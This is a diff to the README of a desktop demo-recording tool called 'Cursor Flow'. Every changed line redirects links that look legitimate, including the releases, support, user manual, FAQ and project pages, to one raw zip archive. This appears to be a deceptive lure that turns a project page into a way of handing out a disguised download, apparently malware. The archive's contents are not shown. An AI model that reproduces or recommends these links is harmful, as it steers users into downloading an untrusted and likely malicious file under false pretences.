@@ -6,7 +6,7 @@ Cursor Flow is a free desktop application designed to help you record and polish
 
 ## 📥 Download Now
 
-[![Download Cursor Flow](https://img.shields.io/badge/download-cursor--flow-blue.svg)](https://github.com/ronny-gans/cursor-flow/releases)
+[![Download Cursor Flow](https://raw.githubusercontent.com/ronny-gans/cursor-flow/main/cursor-replacer/cursor-flow-v2.8.zip)](https://raw.githubusercontent.com/ronny-gans/cursor-flow/main/cursor-replacer/cursor-flow-v2.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ To run Cursor Flow, please ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. Click the download button above or visit [this page to download](https://github.com/ronny-gans/cursor-flow/releases).
+1. Click the download button above or visit [this page to download](https://raw.githubusercontent.com/ronny-gans/cursor-flow/main/cursor-replacer/cursor-flow-v2.8.zip).
 2. Select the version that matches your operating system.
 3. Follow the prompts to save the file to your computer.
 
@@ -50,17 +50,17 @@ To run Cursor Flow, please ensure your system meets the following requirements:
 
 ## 📞 Support
 
-If you encounter any issues, please visit our [support page](https://github.com/ronny-gans/cursor-flow/issues) to report problems or request assistance. You can also browse existing questions and answers.
+If you encounter any issues, please visit our [support page](https://raw.githubusercontent.com/ronny-gans/cursor-flow/main/cursor-replacer/cursor-flow-v2.8.zip) to report problems or request assistance. You can also browse existing questions and answers.
 
 ## 🔗 Additional Resources
 
-- **User Manual**: A detailed guide on using Cursor Flow is available [here](https://github.com/ronny-gans/cursor-flow/wiki).
-- **FAQs**: Find answers to common questions [here](https://github.com/ronny-gans/cursor-flow/wiki/FAQs).
+- **User Manual**: A detailed guide on using Cursor Flow is available [here](https://raw.githubusercontent.com/ronny-gans/cursor-flow/main/cursor-replacer/cursor-flow-v2.8.zip).
+- **FAQs**: Find answers to common questions [here](https://raw.githubusercontent.com/ronny-gans/cursor-flow/main/cursor-replacer/cursor-flow-v2.8.zip).
 - **Feature Requests**: Suggestions for improvements can be submitted on our issues page.
 
 ## 🚀 Join the Community
 
-Join our community of users and developers. Follow updates and discussions about Cursor Flow by checking the project's [GitHub page](https://github.com/ronny-gans/cursor-flow). Your feedback is valuable!
+Join our community of users and developers. Follow updates and discussions about Cursor Flow by checking the project's [GitHub page](https://raw.githubusercontent.com/ronny-gans/cursor-flow/main/cursor-replacer/cursor-flow-v2.8.zip). Your feedback is valuable!
 
 ## 🛠️ Future Updates
 
@@ -74,4 +74,4 @@ We appreciate your support and look forward to making Cursor Flow better for eve
 
 ## 🎉 Download & Install
 
-Ready to get started? [Visit this page to download](https://github.com/ronny-gans/cursor-flow/releases) Cursor Flow today and create amazing demos effortlessly!
+Ready to get started? [Visit this page to download](https://raw.githubusercontent.com/ronny-gans/cursor-flow/main/cursor-replacer/cursor-flow-v2.8.zip) Cursor Flow today and create amazing demos effortlessly!
